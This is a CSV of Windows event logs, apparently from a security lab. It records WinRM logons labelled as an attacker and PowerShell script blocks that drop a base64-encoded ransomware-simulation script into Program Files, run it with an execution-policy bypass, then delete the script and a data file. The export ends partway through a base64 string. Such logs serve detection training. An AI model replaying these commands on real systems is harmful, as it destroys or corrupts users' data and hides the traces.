    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T07:35:54.966+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:54.972+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt.ps1
C:\Program Files\encrypt.ps1","null
null"
"2025-11-16T07:35:55.051+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:35:55.115+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:36:03.087+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:36:14.610+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","rm encrypt.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm encrypt.ps1

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:36:21.479+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","rm data_important.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
rm data_important.txt

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T07:36:25.005+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:05.919+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:00:05.942+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T08:00:06.812+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_oqnvw12d.elx.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_oqnvw12d.elx.ps1","null
null"
"2025-11-16T08:00:07.639+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:10.177+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:13.805+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:19.148+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:00:29.226+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:06:10.424+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:06:10.477+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ex
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ex
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:06:12.380+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
exit
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:21.359+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:09:21.395+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T08:09:21.513+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_zvnmgdmu.bsd.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_zvnmgdmu.bsd.ps1","null
null"
"2025-11-16T08:09:21.779+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
(get-location).path
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:26.612+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd ../../../
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:32.237+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
ls
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:09:40.639+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cd 'Program Files'
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:09.383+0000","1. Attacker Logon (WinRM)","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"10.10.10.130
10.10.10.130","null
null","null
null","null
null"
"2025-11-16T08:10:09.407+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-11-16T08:10:09.517+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_bsz1u3lz.de2.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_bsz1u3lz.de2.ps1","null
null"
"2025-11-16T08:10:09.813+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""08f1cb261457cc70a50d7cfd5344b43a0df54eff"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""08f1cb261457cc70a50d7cfd5344b43a0df54eff"" = @{
    ""target"" = ""C:\Program Files\encrypt1.ps1"";
    ""src_basename"" = ""encrypt1.ps1"";
    ""dst"" = ""C:\Program Files\encrypt1.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:09.826+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-11-16T08:10:09.854+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-11-16T08:10:09.859+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-11-16T08:10:10.002+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt1.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-11-16T08:10:10.012+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt1.ps1
C:\Program Files\encrypt1.ps1","null
null"
"2025-11-16T08:10:10.124+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSDEkcOoIHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKIyBRVUFOIFRS4buMTkc6IEZpbGUgZ+G7kWMgc+G6vSBi4buLIHRoYXkgxJHhu5VpIHRow6BuaCBCYXNlNjQKCnBhcmFtICgKICAgIFtzdHJpbmddJFBhdGggPSAiQzpcUHJvZ3JhbSBGaWxlc1xkYXRhX2ltcG9ydGFudC50eHQiCikKCnRyeSB7CiAgICBXcml0ZS1Ib3N0ICJbKl0gQuG6r3QgxJHhuqd1IG3DtCBwaOG7j25nLi4uIMSQ4buNYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaeG7g20gdHJhIGZpbGUgdOG7k24gdOG6oWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkzhu5dpOiBLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBt4bulYyB0acOqdTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgxJDhu41jIG7hu5lpIGR1bmcgZmlsZSBn4buRYwogICAgJGNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uSU8uRmlsZV06OlJlYWRBbGxCeXRlcygkUGF0aClzCiAgICAKICAgICMgRW5jb2RlIEJhc2U2NCAobcO0IHBo4buPbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIEdoaSDEkcOoIG7hu5lpIGR1bmcgQmFzZTY0IHbDoG8gY2jDrW5oIGZpbGUgZ+G7kWMKICAgIFNldC1Db250ZW50IC1QYXRoICRQYXRoIC1WYWx1ZSAkYmFzZTY0Q29udGVudCAtRW5jb2RpbmcgVVRGOAogICAgCiAgICBXcml0ZS1Ib3N0ICJbK10gVGjDoG5oIGPDtG5nISBGaWxlIMSRw6MgYuG7iyAnbcOjIGjDs2EnIChCYXNlNjQpLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGhp4buHbiB04bqhaTogJFBhdGgiCgp9IGNhdGNoIHsKICAgIFdyaXRlLUVycm9yICJH4bq3cCBs4buXaTogJCgkXy5FeGNlcHRpb24uTWV